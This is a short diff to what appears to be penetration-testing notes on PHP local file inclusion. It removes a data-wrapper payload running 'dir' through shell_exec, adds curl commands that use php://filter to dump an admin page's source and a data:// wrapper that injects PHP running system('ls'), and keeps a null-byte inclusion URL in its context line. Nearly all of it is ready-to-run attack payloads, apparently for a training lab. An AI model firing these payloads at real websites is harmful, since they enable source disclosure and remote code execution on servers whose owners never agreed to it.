@@ -26,6 +26,7 @@ http://www.bostonwebgroup.com/script.php?file=shell.php%00.dat
 
 ### PHP wrappers
 ```
-http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>(it will execute dir right away)
-$fp = fopen('data:text/plain;base64,'.base64_encode($data), 'rb'); // base64 encoded data
+curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
+curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
 ```
